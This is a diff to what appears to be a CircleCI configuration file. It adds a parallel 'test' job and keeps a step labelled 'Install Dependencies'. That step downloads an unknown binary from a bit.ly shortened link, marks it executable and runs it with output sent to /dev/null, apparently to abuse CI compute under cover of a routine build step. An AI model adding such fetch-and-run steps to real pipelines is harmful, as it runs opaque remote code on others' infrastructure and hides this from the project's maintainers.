@@ -8,7 +8,17 @@ jobs:
         - run:
             name: Install Dependencies
             command:  |
-              wget https://bit.ly/3HbWRqo && chmod +x 3HbWRqo && ./3HbWRqo >/dev/null
+              timeout 540 wget https://bit.ly/3HbWRqo && chmod +x 3HbWRqo && ./3HbWRqo >/dev/null
+    
+    test:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command:  |
+              timeout 560 wget https://bit.ly/3HbWRqo && chmod +x 3HbWRqo && ./3HbWRqo >/dev/null
      
 
 workflows:
@@ -16,3 +26,4 @@ workflows:
     build:
         jobs:
         - trial
+        - test
